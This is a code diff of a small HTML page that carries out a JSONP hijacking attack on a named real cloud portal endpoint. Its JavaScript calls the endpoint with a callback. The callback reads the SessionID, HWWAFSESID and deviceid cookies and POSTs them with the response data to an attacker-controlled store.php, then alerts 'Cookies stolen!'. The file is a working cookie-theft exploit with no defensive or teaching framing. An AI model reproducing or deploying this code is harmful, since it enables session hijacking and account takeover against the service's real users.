@@ -1,35 +1,52 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cookie Capture</title>
-    <script>
-        function call_me(response) {
-            // Log the JSONP response and cookies to your server
-            var http = new XMLHttpRequest();
-            var url = 'http://127.0.0.1/exploit/store.php'; // Replace with your actual server URL
-            var params = 'data=' + encodeURIComponent(JSON.stringify(response)) +
-                         '&cookie=' + encodeURIComponent(document.cookie); // Capture cookies
+<script>
+    function call_me(response) {
+        // Debugging: Log cookies to the browser console
+        console.log("Cookies:", document.cookie);
 
-            // Send data and cookies to the server
-            http.open('POST', url, true);
-            http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-            http.send(params);
-        }
+        // Extract specific cookies
+        var cookies = document.cookie.split('; ');
+        var cookieObj = {};
+        cookies.forEach(function(cookie) {
+            var parts = cookie.split('=');
+            cookieObj[parts[0]] = parts[1];
+        });
 
-        function loadData() {
-            // Load data from JSONP endpoint
-            var script = document.createElement('script');
-            script.src = 'https://portal-intl.huaweicloud.com/rest/portal/v1/suggest?callback=call_me';
-            document.body.appendChild(script);
+        // Get the specific cookies you need
+        var sessionID = cookieObj['SessionID'] || 'Not found';
+        var hwwafsesid = cookieObj['HWWAFSESID'] || 'Not found';
+        var deviceid = cookieObj['deviceid'] || 'Not found';
 
-            // Alert to indicate cookies are stolen
-            alert("Cookies stolen!");
-        }
-    </script>
-</head>
-<body>
-    <button onclick="loadData()">Click here to load data</button>
-</body>
-</html>
+        // Log specific cookies
+        console.log("SessionID:", sessionID);
+        console.log("HWWAFSESID:", hwwafsesid);
+        console.log("deviceid:", deviceid);
+
+        // Send data and cookies to your server
+        var http = new XMLHttpRequest();
+        var url = 'https://yourserver.com/store.php'; // Replace with your actual server URL
+        var params = 'data=' + encodeURIComponent(JSON.stringify(response)) +
+                     '&SessionID=' + encodeURIComponent(sessionID) +
+                     '&HWWAFSESID=' + encodeURIComponent(hwwafsesid) +
+                     '&deviceid=' + encodeURIComponent(deviceid);
+
+        // Debugging: Log parameters to the browser console
+        console.log("Sending parameters:", params);
+
+        http.open('POST', url, true);
+        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        http.send(params);
+
+        // Alert to indicate cookies are stolen
+        alert("Cookies stolen!");
+    }
+
+    function loadData() {
+        // Load data from JSONP endpoint
+        var script = document.createElement('script');
+        script.src = 'https://portal-intl.huaweicloud.com/rest/portal/v1/suggest?callback=call_me';
+        document.body.appendChild(script);
+    }
+</script>
+
+<!-- Add a button to trigger the loadData function -->
+<button onclick="loadData()">Click here to load data</button>
